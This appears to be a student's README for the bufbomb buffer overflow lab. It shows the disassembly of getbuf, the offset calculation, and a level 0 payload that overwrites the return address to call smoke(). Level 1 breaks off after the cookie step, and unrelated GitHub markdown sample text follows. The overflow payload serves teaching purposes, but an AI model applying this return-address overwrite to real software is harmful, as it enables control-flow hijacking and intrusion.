# Bufbomb

实验整体思路为，在给定的32位程序-bufbomb输入溢出内容，达到改变程序原有执行顺序。

网上也有相同内容，但反汇编结果不同。我们用bufbomb来做实验，bufbomb on the internet 可以用来做参考。

## level 0
首先通过 `objdump -d bufbomb > buf_asm` 导出bufbomb反汇编文件。

网络流传的一套反汇编结果
```
08048c04 <getbuf>:
 8048c04:	55                   	push   %ebp
 8048c05:	89 e5                	mov    %esp,%ebp
 8048c07:	83 ec 38             	sub    $0x38,%esp
 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax
 8048c0d:	89 04 24             	mov    %eax,(%esp)
```
**ebp** 压栈，**esp** 指向 **ebp**，**esp** 减 *0x38* 开出栈空间，**eax** 参数地址指向 **ebp** 加 *0x28*。    
所以整个输入栈为：

>40字节 + ebp + ret 地址 = 40 + 4 +4 = 48字节。


The disassembly result of our bufbomb.
```
08048ed2 <getbuf>:
 8048ed2:   83 ec 3c                sub    $0x3c,%esp
 8048ed5:   8d 44 24 10             lea    0x10(%esp),%eax
 8048ed9:   89 04 24                mov    %eax,(%esp)
```
There is no **ebp** register in this disassembly program，估计哪位改了改。    
Let's go! **esp** sub *0x3c*，**eax** point to **esp** plus *0x10* equal to *0x2c*，    
So the distance form **eax** to ret is：    

>44bytes + ret address = 44 + 4 = 48bytes

We get the same result 48.

Finally, according to your own situation，turn the adress to the address of _somke()_ function： `08048ccc <smoke>:`

```
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
cc 8c 04 08
```

> Userid: hanggi    
 Cookie: 0x11c1be21    
 Type string:Smoke!: You called smoke()    
 VAILD    
> NICE JOB!


## level 1
在这个level，我们的任务是调用 *fizz()* 函数。但是fizz需要一个参数，当这个参数等于你的cookie时，才能通过升级。

Let's use the following command.
`$ ./makecookie hanggi`
I got the value of 0x11c1be21.


## title

*This text will be italic*
_This will also be italic_

**This text will be bold**
__This will also be bold__

_You **can** combine them_

* Item 1
* Item 2
  * Item 2a
  * Item 2b

1. Item 1
2. Item 2
3. Item 3
   * Item 3a
   * Item 3b

![GitHub Logo](/images/logo.png)
Format: ![Alt Text](url)

http://github.com - automatic!
[GitHub](http://github.com)

As Kanye West said:

> We're living the future so
> the present is our past.


I think you should use an
`<addr>` element here instead.


```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```




- [x] @mentions, #refs, [links](), **formatting**, and <del>tags</del> supported
- [x] list syntax required (any unordered or ordered list supported)
- [x] this is a complete item
- [ ] this is an incomplete item



First Header | Second Header
------------ | -------------
Content from cell 1 | Content from cell 2
Content in the first column | Content in the second column
